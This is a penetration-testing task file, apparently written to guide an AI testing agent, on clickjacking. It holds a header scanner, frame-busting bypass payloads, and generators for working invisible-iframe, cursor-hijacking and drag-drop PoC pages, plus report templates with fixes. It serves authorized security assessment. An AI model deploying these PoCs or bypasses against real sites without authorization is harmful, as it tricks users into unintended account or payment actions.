@@ -1,0 +1,610 @@
+================================================================================
+TASK 94 - CLICKJACKING / UI REDRESSING
+================================================================================
+Covers testing_toolkit.txt Phase 15 Step 49
+Frame-based attacks and X-Frame-Options bypass
+
+CLICKJACKING = VISUAL DECEPTION
+You overlay your evil content on top of a legitimate site.
+Victim thinks they're clicking your button, actually clicking theirs.
+
+Real attacks:
+- "Play Video" button → actually clicks "Transfer Money"
+- "Close Ad" button → actually clicks "Delete Account"
+- Cursor manipulation → click somewhere else entirely
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/url_corpus_all_in_scope.txt        <- URL corpus
+outputs/har/accounts/*_auth.json           <- Auth tokens
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/clickjacking/
+    frameable_pages.txt                    <- Pages without frame protection
+    sensitive_frameable.txt                <- High-value frameable pages
+    csp_frame_bypass.txt                   <- CSP frame-ancestors bypasses
+    poc_html_files/                        <- Generated PoC HTML files
+        poc_<domain>_<page>.html
+
+outputs/vulnerabilities/CLICKJACKING-*-MEDIUM.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND FRAME PROTECTIONS:
+
+    How sites prevent framing:
+    |
+    +-- X-Frame-Options (XFO) header
+    |   +-- DENY - no framing allowed
+    |   +-- SAMEORIGIN - only same origin can frame
+    |   +-- ALLOW-FROM uri - deprecated, not widely supported
+    |
+    +-- Content-Security-Policy (CSP) frame-ancestors
+    |   +-- 'none' - equivalent to DENY
+    |   +-- 'self' - equivalent to SAMEORIGIN
+    |   +-- https://trusted.com - specific origins
+    |
+    +-- JavaScript frame-busting
+        +-- if (top != self) top.location = self.location
+        +-- Can be bypassed!
+
+    Vulnerability check:
+    |
+    No XFO header?                   → FRAMEABLE
+    No CSP frame-ancestors?          → FRAMEABLE
+    XFO: ALLOW-FROM *?               → FRAMEABLE
+    Frame-busting only?              → POTENTIALLY BYPASSABLE
+
+================================================================================
+PHASE 1: DETECT FRAMEABLE PAGES
+================================================================================
+
+-----------------------------------------
+1.1 Check Frame Protection Headers
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+clickjacking_scanner.py - Find frameable pages
+"""
+
+import requests
+import os
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+os.makedirs('outputs/clickjacking', exist_ok=True)
+os.makedirs('outputs/clickjacking/poc_html_files', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class ClickjackingScanner:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.frameable = []
+    
+    def check_url(self, url):
+        """Check if URL is frameable"""
+        
+        try:
+            resp = self.session.get(url, timeout=15, verify=False)
+            
+            # Check X-Frame-Options
+            xfo = resp.headers.get('X-Frame-Options', '').upper()
+            
+            # Check CSP frame-ancestors
+            csp = resp.headers.get('Content-Security-Policy', '')
+            frame_ancestors = ''
+            if 'frame-ancestors' in csp:
+                # Extract frame-ancestors value
+                import re
+                match = re.search(r"frame-ancestors\s+([^;]+)", csp)
+                if match:
+                    frame_ancestors = match.group(1).strip()
+            
+            # Determine if frameable
+            is_protected = False
+            protection = []
+            
+            if xfo in ['DENY', 'SAMEORIGIN']:
+                is_protected = True
+                protection.append(f'XFO: {xfo}')
+            
+            if frame_ancestors:
+                if "'none'" in frame_ancestors or "'self'" in frame_ancestors:
+                    is_protected = True
+                protection.append(f'CSP: {frame_ancestors}')
+            
+            return {
+                'url': url,
+                'frameable': not is_protected,
+                'xfo': xfo,
+                'csp_frame': frame_ancestors,
+                'protection': protection,
+                'status': resp.status_code
+            }
+            
+        except Exception as e:
+            return {'url': url, 'error': str(e)}
+    
+    def scan_all(self, urls, threads=10):
+        """Scan all URLs"""
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(self.check_url, url): url 
+                      for url in urls}
+            
+            for future in as_completed(futures):
+                try:
+                    result = future.result()
+                    if result.get('frameable'):
+                        self.frameable.append(result)
+                except:
+                    pass
+
+-----------------------------------------
+1.2 Identify Sensitive Frameable Pages
+-----------------------------------------
+SENSITIVE_PATTERNS = [
+    # Account actions
+    '/account', '/profile', '/settings', '/preferences',
+    '/password', '/email', '/delete', '/deactivate',
+    
+    # Financial actions
+    '/transfer', '/payment', '/checkout', '/donate',
+    '/withdraw', '/deposit', '/send',
+    
+    # Administrative
+    '/admin', '/manage', '/dashboard', '/config',
+    
+    # Social actions
+    '/follow', '/like', '/subscribe', '/share',
+    '/friend', '/connect', '/invite',
+    
+    # Permissions
+    '/authorize', '/grant', '/allow', '/consent',
+    '/oauth', '/permissions',
+    
+    # Forms
+    '/form', '/submit', '/apply', '/register',
+]
+
+def categorize_frameable(frameable_results):
+    """Categorize frameable pages by sensitivity"""
+    
+    sensitive = []
+    
+    for result in frameable_results:
+        url_lower = result['url'].lower()
+        
+        for pattern in SENSITIVE_PATTERNS:
+            if pattern in url_lower:
+                result['sensitivity'] = 'HIGH'
+                result['pattern'] = pattern
+                sensitive.append(result)
+                break
+    
+    return sensitive
+
+================================================================================
+PHASE 2: FRAME-BUSTING BYPASSES
+================================================================================
+
+-----------------------------------------
+2.1 Common Frame-Busting Code
+-----------------------------------------
+"""
+COMMON FRAME-BUSTING TECHNIQUES:
+
+1. Basic redirect:
+   if (top != self) { top.location = self.location; }
+
+2. Break out:
+   if (top.location != self.location) { top.location = self.location; }
+
+3. Repeated check:
+   setInterval(function() {
+     if (top != self) top.location = self.location;
+   }, 1);
+
+BYPASSES:
+"""
+
+-----------------------------------------
+2.2 Frame-Busting Bypass Techniques
+-----------------------------------------
+BYPASS_POCS = {
+    'sandbox_bypass': '''
+<!-- sandbox attribute prevents JS execution including frame-busting -->
+<iframe sandbox="allow-forms" src="TARGET_URL"></iframe>
+''',
+
+    'double_frame': '''
+<!-- Double framing can confuse top checks -->
+<iframe src="data:text/html,<iframe src='TARGET_URL'></iframe>"></iframe>
+''',
+
+    'onbeforeunload': '''
+<!-- Prevent navigation with onbeforeunload -->
+<iframe src="TARGET_URL" 
+        onload="this.contentWindow.onbeforeunload=function(){return false;}">
+</iframe>
+''',
+
+    'location_clobber': '''
+<!-- Clobber window.location object -->
+<iframe src="TARGET_URL" name="location"></iframe>
+''',
+
+    'xss_filter': '''
+<!-- Use XSS filter to block frame-busting script (legacy) -->
+<iframe src="TARGET_URL%26xss=<script>if">
+</iframe>
+''',
+
+    'ie_security_zone': '''
+<!-- IE restricted zone blocks JS -->
+<iframe security="restricted" src="TARGET_URL"></iframe>
+''',
+
+    'chrome_sandbox': '''
+<!-- Chrome-specific sandbox -->
+<iframe src="TARGET_URL" sandbox="allow-forms allow-scripts"></iframe>
+''',
+}
+
+================================================================================
+PHASE 3: GENERATE POC HTML
+================================================================================
+
+-----------------------------------------
+3.1 Basic Clickjacking PoC
+-----------------------------------------
+def generate_clickjacking_poc(target_url, button_text="Click to Win!"):
+    """Generate clickjacking PoC HTML"""
+    
+    poc = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking PoC</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+        }}
+        
+        .container {{
+            position: relative;
+            width: 100%;
+            height: 100vh;
+        }}
+        
+        /* The target iframe - invisible */
+        iframe {{
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.0001;  /* Nearly invisible */
+            z-index: 2;       /* On top */
+            border: none;
+        }}
+        
+        /* The decoy button */
+        .decoy {{
+            position: absolute;
+            top: 200px;       /* Align with target button */
+            left: 300px;      /* Adjust to target position */
+            z-index: 1;       /* Behind iframe */
+            padding: 15px 30px;
+            font-size: 20px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }}
+        
+        .instructions {{
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: #333;
+            color: white;
+            padding: 10px;
+            z-index: 100;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Invisible iframe with target page -->
+        <iframe src="{target_url}"></iframe>
+        
+        <!-- Decoy button underneath -->
+        <button class="decoy">{button_text}</button>
+    </div>
+    
+    <div class="instructions">
+        <b>PoC Instructions:</b><br>
+        1. Adjust iframe opacity to 0.5 to see alignment<br>
+        2. Move decoy button to align with target action<br>
+        3. Set opacity back to 0.0001 for attack<br>
+        4. Victim clicks decoy, actually clicks target
+    </div>
+</body>
+</html>"""
+    
+    return poc
+
+-----------------------------------------
+3.2 Advanced PoC Variants
+-----------------------------------------
+def generate_cursor_hijack_poc(target_url):
+    """Generate cursor hijacking PoC"""
+    
+    return f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>Cursor Hijacking PoC</title>
+    <style>
+        body {{
+            cursor: none;  /* Hide real cursor */
+        }}
+        
+        #fakeCursor {{
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            pointer-events: none;
+            z-index: 9999;
+        }}
+        
+        iframe {{
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }}
+    </style>
+</head>
+<body>
+    <img id="fakeCursor" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='20' height='20'><polygon points='0,0 0,16 4,12 8,20 10,19 6,11 12,11' fill='black'/></svg>">
+    
+    <iframe src="{target_url}"></iframe>
+    
+    <script>
+        // Fake cursor follows real cursor with offset
+        var offset = 200;  // Pixel offset
+        
+        document.addEventListener('mousemove', function(e) {{
+            document.getElementById('fakeCursor').style.left = 
+                (e.clientX - offset) + 'px';
+            document.getElementById('fakeCursor').style.top = 
+                e.clientY + 'px';
+        }});
+    </script>
+    
+    <!-- Victim sees cursor at one position, clicks at another -->
+</body>
+</html>"""
+
+def generate_drag_drop_poc(target_url):
+    """Generate drag-and-drop clickjacking PoC"""
+    
+    return f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>Drag-Drop Clickjacking PoC</title>
+    <style>
+        .drag-source {{
+            width: 200px;
+            height: 50px;
+            background: #4CAF50;
+            color: white;
+            text-align: center;
+            line-height: 50px;
+            cursor: grab;
+        }}
+        
+        iframe {{
+            position: absolute;
+            top: 200px;
+            left: 100px;
+            opacity: 0.0001;
+        }}
+    </style>
+</head>
+<body>
+    <div class="drag-source" draggable="true" 
+         ondragstart="event.dataTransfer.setData('text', 'malicious content')">
+        Drag me!
+    </div>
+    
+    <!-- Target iframe with drop zone -->
+    <iframe src="{target_url}"></iframe>
+    
+    <!-- Victim drags content, drops into invisible target -->
+</body>
+</html>"""
+
+================================================================================
+PHASE 4: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+clickjacking_complete.py - Complete clickjacking assessment
+"""
+
+import os
+import json
+import requests
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+os.makedirs('outputs/clickjacking', exist_ok=True)
+os.makedirs('outputs/clickjacking/poc_html_files', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class ClickjackingAudit:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.frameable = []
+        self.sensitive = []
+    
+    def check_url(self, url):
+        """Check single URL for clickjacking"""
+        
+        try:
+            resp = self.session.get(url, timeout=15, verify=False)
+            
+            xfo = resp.headers.get('X-Frame-Options', '').upper()
+            csp = resp.headers.get('Content-Security-Policy', '')
+            
+            # Check protections
+            has_xfo = xfo in ['DENY', 'SAMEORIGIN']
+            has_csp = 'frame-ancestors' in csp and (
+                "'none'" in csp or "'self'" in csp
+            )
+            
+            return {
+                'url': url,
+                'frameable': not (has_xfo or has_csp),
+                'xfo': xfo or 'NONE',
+                'csp': 'frame-ancestors' in csp,
+                'status': resp.status_code
+            }
+            
+        except:
+            return None
+    
+    def scan_all(self, urls, threads=10):
+        """Scan all URLs"""
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(self.check_url, url): url 
+                      for url in urls}
+            
+            for future in as_completed(futures):
+                result = future.result()
+                if result and result['frameable']:
+                    self.frameable.append(result)
+                    
+                    # Check sensitivity
+                    if any(p in result['url'].lower() 
+                           for p in SENSITIVE_PATTERNS):
+                        self.sensitive.append(result)
+    
+    def generate_pocs(self):
+        """Generate PoC files for sensitive pages"""
+        
+        for result in self.sensitive:
+            url = result['url']
+            domain = urlparse(url).netloc.replace('.', '_')
+            path = urlparse(url).path.replace('/', '_')
+            
+            filename = f"poc_{domain}{path}.html"
+            filepath = f"outputs/clickjacking/poc_html_files/{filename}"
+            
+            poc = generate_clickjacking_poc(url)
+            
+            with open(filepath, 'w') as f:
+                f.write(poc)
+    
+    def generate_reports(self):
+        """Generate vulnerability reports"""
+        
+        for i, vuln in enumerate(self.sensitive):
+            report = f"""# Clickjacking Vulnerability
+
+**URL**: {vuln['url']}
+**Severity**: MEDIUM
+
+## Missing Protections
+- **X-Frame-Options**: {vuln['xfo']}
+- **CSP frame-ancestors**: {'Not set' if not vuln['csp'] else 'Insufficient'}
+
+## Description
+The page lacks proper clickjacking protections. An attacker can embed
+this page in an invisible iframe and trick users into clicking hidden
+elements.
+
+## Attack Scenario
+1. Attacker creates malicious page with invisible iframe
+2. Target page loaded in iframe
+3. Decoy buttons positioned over real buttons
+4. Victim clicks decoy, actually triggers action on target
+
+## Recommendations
+1. Add `X-Frame-Options: DENY` or `SAMEORIGIN` header
+2. Add CSP `frame-ancestors 'none'` or `'self'`
+3. Both headers for defense-in-depth
+"""
+            
+            with open(f'outputs/vulnerabilities/CLICKJACKING-{i}-MEDIUM.md', 'w') as f:
+                f.write(report)
+    
+    def save_results(self):
+        """Save all results"""
+        
+        with open('outputs/clickjacking/frameable_pages.txt', 'w') as f:
+            for r in self.frameable:
+                f.write(f"{r['url']}\n")
+        
+        with open('outputs/clickjacking/sensitive_frameable.txt', 'w') as f:
+            for r in self.sensitive:
+                f.write(f"{r['url']}\n")
+        
+        with open('outputs/clickjacking/results.json', 'w') as f:
+            json.dump({
+                'frameable': self.frameable,
+                'sensitive': self.sensitive
+            }, f, indent=2)
+
+# Run
+if __name__ == "__main__":
+    # Load URLs
+    with open('outputs/url_corpus_all_in_scope.txt') as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    print(f"[*] Checking {len(urls)} URLs for clickjacking...")
+    
+    audit = ClickjackingAudit()
+    audit.scan_all(urls)
+    audit.generate_pocs()
+    audit.generate_reports()
+    audit.save_results()
+    
+    print(f"\n[*] Frameable pages: {len(audit.frameable)}")
+    print(f"[*] Sensitive frameable: {len(audit.sensitive)}")
+    print(f"[*] PoCs generated in outputs/clickjacking/poc_html_files/")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] X-Frame-Options header checked on all pages
+[ ] CSP frame-ancestors checked on all pages
+[ ] Sensitive pages identified (account, payment, etc.)
+[ ] PoC HTML files generated for vulnerable pages
+[ ] Frame-busting bypass techniques tested
+[ ] Cursor hijacking PoC generated if applicable
+[ ] All findings documented
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 95: CSP Bypass (Phase 15 - Misc Advanced)
